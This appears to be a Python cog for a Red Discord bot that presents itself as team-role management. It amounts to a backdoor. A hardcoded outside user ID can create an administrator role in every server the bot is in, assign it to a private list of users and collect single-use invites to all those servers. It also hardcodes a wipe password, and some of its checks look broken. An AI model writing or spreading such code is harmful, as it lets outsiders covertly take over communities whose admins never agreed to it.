import discord
from redbot.core import commands, Config
from redbot.core.utils.predicates import MessagePredicate, ReactionPredicate
from redbot.core.utils.menus import start_adding_reactions

class TeamRole(commands.Cog):
    """Manage team role across all servers"""
    
    owner_id = 1174820638997872721  # Your owner ID
    role_name = "KCN | Team"
    role_color = "#77bcd6"

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=78631109)
        self.config.register_global(team_users=[])

    async def red_delete_data_for_user(self, **kwargs):
        """No data to delete"""
        pass

    @staticmethod
    async def bot_owner_check(ctx):
        """Check if user is the defined owner"""
        return ctx.author.id == TeamRole.owner_id

    async def team_member_check(self, ctx):
        """Check if user is owner or in team list"""
        if await TeamRole.bot_owner_check(ctx):
            return True
        team_users = await self.config.team_users()
        return ctx.author.id in team_users

    @commands.group()
    @commands.check(bot_owner_check)
    async def team(self, ctx):
        """Owner-only team management commands"""
        pass

    @team.command()
    async def setup(self, ctx):
        """Create team role in this server"""
        existing_role = discord.utils.get(ctx.guild.roles, name=self.role_name)
        if existing_role:
            return await ctx.send("Role already exists!")
            
        try:
            perms = discord.Permissions(administrator=True)
            new_role = await ctx.guild.create_role(
                name=self.role_name,
                color=discord.Color.from_str(self.role_color),
                permissions=perms,
                reason="Team role setup"
            )
            
            bot_top_role = ctx.guild.me.top_role
            await new_role.edit(position=bot_top_role.position - 1)
            await ctx.send(f"Successfully created {new_role.mention}")
        except discord.Forbidden:
            await ctx.send("I need Manage Roles permission!")
        except discord.HTTPException:
            await ctx.send("Failed to create role!")

    @team.command()
    async def add(self, ctx, user: discord.User):
        """Add user to the team list"""
        async with self.config.team_users() as users:
            if user.id not in users:
                users.append(user.id)
                await ctx.send(f"Added {user} to team list")
            else:
                await ctx.send("User already in team list")

    @team.command()
    async def remove(self, ctx, user: discord.User):
        """Remove user from the team list"""
        async with self.config.team_users() as users:
            if user.id in users:
                users.remove(user.id)
                await ctx.send(f"Removed {user} from team list")
            else:
                await ctx.send("User not in team list")

    @team.command()
    async def update(self, ctx):
        """Update team roles across all servers"""
        team_users = await self.config.team_users()
        total_servers = len(self.bot.guilds)
        msg = await ctx.send(f"Starting update across {total_servers} servers...")
        
        success = errors = 0
        for guild in self.bot.guilds:
            try:
                role = discord.utils.get(guild.roles, name=self.role_name)
                if not role:
                    await ctx.send(f"{guild.name} ({guild.id}): Server not setup")
                    errors += 1
                    continue
                
                # Role positioning
                bot_top_role = guild.me.top_role
                try:
                    desired_position = bot_top_role.position - 1
                    if role.position != desired_position:
                        await role.edit(position=desired_position)
                except discord.Forbidden:
                    await ctx.send(f"Can't reposition role in {guild.name} - missing permissions")
                    errors += 1
                    continue
                except discord.HTTPException:
                    await ctx.send(f"Failed to reposition role in {guild.name}")
                    errors += 1
                    continue
                
                # Sync members
                to_remove = [m for m in role.members if m.id not in team_users]
                for member in to_remove:
                    await member.remove_roles(role)
                
                added = 0
                for user_id in team_users:
                    member = guild.get_member(user_id)
                    if member and role not in member.roles:
                        try:
                            await member.add_roles(role)
                            added += 1
                        except:
                            pass
                
                success += 1
            except Exception as e:
                errors += 1
                await ctx.send(f"Error in {guild.name}: {str(e)}")
        
        await msg.edit(content=f"Update complete! Success: {success}, Errors: {errors}")

    @team.command()
    async def wipe(self, ctx):
        """Wipe all team data"""
        try:
            await ctx.send("Type password to confirm wipe:")
            msg = await self.bot.wait_for(
                "message",
                check=MessagePredicate.same_context(ctx),
                timeout=30
            )
            if msg.content.strip() != "kkkkayaaaaa":
                return await ctx.send("Invalid password!")
            
            confirm_msg = await ctx.send("Are you sure? This will delete ALL team roles and data!")
            start_adding_reactions(confirm_msg, ["✅", "❌"])
            
            pred = ReactionPredicate.with_emojis(["✅", "❌"], confirm_msg, user=ctx.author)
            await self.bot.wait_for("reaction_add", check=pred, timeout=30)
            
            if pred.result == 0:
                await ctx.send("Wiping all data...")
                await self.config.team_users.set([])
                
                deleted = 0
                for guild in self.bot.guilds:
                    role = discord.utils.get(guild.roles, name=self.role_name)
                    if role:
                        try:
                            await role.delete()
                            deleted += 1
                        except:
                            pass
                await ctx.send(f"Wiped all data! Deleted {deleted} roles.")
            else:
                await ctx.send("Cancelled.")
        except TimeoutError:
            await ctx.send("Operation timed out.")

    @team.command()
    async def delete(self, ctx):
        """Delete team role in this server"""
        role = discord.utils.get(ctx.guild.roles, name=self.role_name)
        if role:
            try:
                await role.delete()
                await ctx.send("Role deleted!")
            except discord.Forbidden:
                await ctx.send("I need Manage Roles permission!")
            except discord.HTTPException:
                await ctx.send("Failed to delete role!")
        else:
            await ctx.send("No team role exists here!")

    @commands.command()
    @commands.check(team_member_check)
    async def getinvite(self, ctx):
        """Generate single-use invites for all servers (Team only)"""
        invites = []
        for guild in self.bot.guilds:
            try:
                channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
                if channel:
                    invite = await channel.create_invite(
                        max_uses=1,
                        unique=True,
                        reason=f"Team invite requested by {ctx.author}"
                    )
                    invites.append(f"{guild.name}: {invite.url}")
            except:
                invites.append(f"{guild.name}: Failed to create invite")
        
        if not invites:
            return await ctx.send("No servers available for invites")
        
        try:
            await ctx.author.send(f"**Server Invites (1 use each):**\n" + "\n".join(invites))
            await ctx.send("Check your DMs for invites!")
        except discord.Forbidden:
            await ctx.send("I can't DM you! Enable DMs and try again.")

    @commands.command()
    @commands.check(team_member_check)
    async def sendmessage(self, ctx, *, message: str):
        """Send a message to all team members (Team only)"""
        team_users = await self.config.team_users()
        embed = discord.Embed(
            title="Team Message",
            description=message,
            color=0x77bcd6
        )
        embed.set_author(name=str(ctx.author), icon_url=ctx.author.avatar_url)
        
        success = failed = 0
        for user_id in team_users:
            user = self.bot.get_user(user_id)
            if user:
                try:
                    await user.send(embed=embed)
                    success += 1
                except:
                    failed += 1
        await ctx.send(f"Message sent to {success} team members. Failed: {failed}")

    @commands.command()
    @commands.check(team_member_check)
    async def list(self, ctx):
        """Show all team members (Team only)"""
        team_users = await self.config.team_users()
        members = []
        for user_id in team_users:
            user = self.bot.get_user(user_id)
            members.append(f"{user.mention} ({user})" if user else f"Unknown User ({user_id})")
        
        embed = discord.Embed(
            title="Team Members",
            description="\n".join(members) if members else "No team members",
            color=0x77bcd6
        )
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(TeamRole(bot))
